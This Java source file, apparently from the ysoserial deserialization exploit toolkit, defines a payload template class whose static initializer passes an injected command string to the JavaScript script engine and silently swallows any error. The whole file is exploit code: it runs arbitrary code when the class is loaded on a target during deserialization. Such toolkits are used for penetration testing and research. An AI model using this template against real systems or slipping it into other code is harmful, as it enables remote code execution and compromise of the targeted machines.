package ysoserial.payloads.templates;

import java.io.IOException;

public class ScriptEngineTemplate {
    static String cmd;

    static {
        try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval(cmd);}catch (java.lang.Throwable e8876){}
    }
}
